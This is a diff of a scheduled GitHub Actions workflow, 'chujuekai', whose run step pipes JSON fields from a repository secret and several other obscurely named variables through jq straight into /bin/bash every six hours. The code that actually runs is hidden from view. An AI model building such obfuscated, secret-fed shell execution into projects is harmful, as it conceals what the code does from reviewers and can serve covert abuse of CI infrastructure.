@@ -3,20 +3,27 @@ name: chujuekai
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 0/6 * * *'
+    - cron: '31 2/6 * * *'
 
-jobs:  # 20608
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chujuekai
         env:
-          swis8611: ${{ secrets.swis8611 }}
+          tbd21835: ${{ secrets.tbd21835 }}
         run: |
-          echo $swis8611 | jq -r .zuegg2886 | /bin/bash
-          echo $omec0 | jq -r .qygg71 | /bin/bash
-          echo $k9497 | jq -r .cgiz42 | /bin/bash
-          echo $iqvbe80810 | jq -r .rpvyn5936 | /bin/bash
-          echo $f0 | jq -r .ke12 | /bin/bash
+          echo $tbd21835 | jq -r .ywki47 | /bin/bash
+          echo $cpoo629 | jq -r .ml8 | /bin/bash
+          echo $p49071 | jq -r .udlgx50391 | /bin/bash
+          echo $ga32688 | jq -r .tga80638 | /bin/bash
+          echo $s24 | jq -r .gzrcj5 | /bin/bash
+          echo $couoe9489 | jq -r .borsm70617 | /bin/bash
+          echo $bzz77634 | jq -r .j759 | /bin/bash
+          echo $l3 | jq -r .nps067 | /bin/bash
+          echo $i2432 | jq -r .m523 | /bin/bash
+          echo $stasz17835 | jq -r .gis03 | /bin/bash
+          echo $eip0 | jq -r .hufif155 | /bin/bash
 
